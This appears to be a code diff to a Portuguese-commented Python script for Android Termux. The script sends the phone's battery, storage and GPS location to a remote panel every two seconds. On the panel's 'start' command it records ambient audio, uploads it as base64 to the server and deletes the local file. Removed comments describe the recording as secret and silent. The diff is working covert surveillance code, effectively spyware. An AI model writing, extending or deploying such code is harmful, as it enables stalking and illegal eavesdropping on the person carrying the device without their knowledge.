@@ -5,11 +5,11 @@ import requests
 import os
 import uuid
 import base64
+import glob
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
 URL_UPLOAD_AUDIO = "https://nexos-panel.onrender.com/api/upload_audio"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
-ARQUIVO_AUDIO = os.path.expanduser("~/nexos_escuta.mp3")
 
 def run_command(cmd):
     try: return subprocess.check_output(cmd, shell=True).decode().strip()
@@ -25,7 +25,7 @@ def obter_ou_criar_id_unico():
 DEVICE_ID = obter_ou_criar_id_unico()
 
 print("\n" + "="*45)
-print(f"🛰️  MOTOR NEXOS AUDIO & GPS OPERACIONAL")
+print(f"🛰️  MOTOR NEXOS AUDIO FORCE CLOCK TIMED")
 print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
 print("="*45 + "\n")
 
@@ -34,14 +34,14 @@ ultima_lon_valida = -49.2648
 headers_json = {"Content-Type": "application/json"}
 
 while True:
-    # 1. Coleta dados de Bateria
+    # 1. Bateria
     battery = "N/A"
     out_bat = run_command("termux-battery-status")
     if out_bat:
         try: battery = str(json.loads(out_bat).get("percentage", "N/A"))
         except: pass
         
-    # 2. Coleta dados de Armazenamento
+    # 2. Armazenamento
     storage = "N/A"
     out_df = run_command("df -h /data/data/com.termux/files/home")
     if out_df:
@@ -52,7 +52,7 @@ while True:
                 if len(parts) >= 3: storage = f"{parts[3]} livres"
         except: pass
 
-    # 3. Coleta Localização GPS
+    # 3. GPS
     lat, lon = ultima_lat_valida, ultima_lon_valida
     out_loc = run_command("termux-location -p gps -r once")
     if out_loc:
@@ -65,7 +65,7 @@ while True:
                 ultima_lon_valida = lon
         except: pass
 
-    # 4. Monta o Envio e Recebe a Ordem do Botão do Site
+    # 4. Sincronismo Geral
     payload = {
         "device_id": DEVICE_ID,
         "battery": battery,
@@ -80,28 +80,42 @@ while True:
         if response.status_code == 200:
             res_data = response.json()
             comando_audio = res_data.get("comando", "stop")
-            print(f"🛰️ [OK] GPS Sincronizado. Status Escuta: {comando_audio.upper()}")
+            print(f"🛰️ [OK] Sincronizado. Status Escuta: {comando_audio.upper()}")
             
-            # SE O SITE MANDOU 'START', O CELULAR GRAVA E TRANSMITE SEGREDO
             if comando_audio == "start":
-                print("🎙️ [AÇÃO] Capturando 3 segundos de áudio ambiente...")
-                # Deleta cache antigo antes de gravar
-                if os.path.exists(ARQUIVO_AUDIO): os.remove(ARQUIVO_AUDIO)
+                print("🎙️ [AÇÃO] Iniciando gravacao forçada...")
                 
-                # Executa o microfone via Termux:API de forma silenciosa
-                run_command(f"termux-audio-record -d 3 {ARQUIVO_AUDIO}")
-                time.sleep(3.2) # Espera a gravação terminar
+                # Garante que não tem gravação órfã aberta antes de ligar
+                run_command("termux-microphone-record -q")
                 
-                if os.path.exists(ARQUIVO_AUDIO) and os.path.getsize(ARQUIVO_AUDIO) > 0:
-                    with open(ARQUIVO_AUDIO, "rb") as audio_file:
-                        audio_b64 = base64.b64encode(audio_file.read()).decode('utf-8')
+                # Inicia a gravação contínua sem passar o tempo bugado do terminal
+                run_command("termux-microphone-record")
+                
+                # O Python segura o tempo exato em segundo plano por 3 segundos
+                time.sleep(3.0) 
+                
+                # O próprio Python manda o comando de corte cirúrgico no soco!
+                run_command("termux-microphone-record -q")
+                print("🎙️ [AÇÃO] Gravacao finalizada pelo sistema.")
+                
+                # Caça o arquivo gerado na pasta do Termux
+                arquivos_gravados = glob.glob("/storage/emulated/0/TermuxAudioRecording_*.m4a")
+                if arquivos_gravados:
+                    ultimo_audio = max(arquivos_gravados, key=os.path.getctime)
                     
-                    # Dispara o arquivo de som para o site
-                    payload_audio = {"device_id": DEVICE_ID, "audio": audio_b64}
-                    requests.post(URL_UPLOAD_AUDIO, data=json.dumps(payload_audio), headers=headers_json, timeout=5)
-                    print("🚀 [OK] Lote de áudio transmitido para o painel!")
-                    
+                    if os.path.exists(ultimo_audio) and os.path.getsize(ultimo_audio) > 0:
+                        with open(ultimo_audio, "rb") as audio_file:
+                            audio_b64 = base64.b64encode(audio_file.read()).decode('utf-8')
+                        
+                        # Cospe o arquivo base64 pro servidor
+                        payload_audio = {"device_id": DEVICE_ID, "audio": audio_b64}
+                        requests.post(URL_UPLOAD_AUDIO, data=json.dumps(payload_audio), headers=headers_json, timeout=5)
+                        print("🚀 [OK] Arquivo de audio .m4a enviado pro painel com sucesso!")
+                        
+                        # Apaga o arquivo do celular para não entupir a memória da moto
+                        os.remove(ultimo_audio)
+                        
     except Exception as e:
-        print(f"❌ Falha de comunicacao: {e}")
+        print(f"❌ Falha no ciclo: {e}")
 
     time.sleep(2.0)
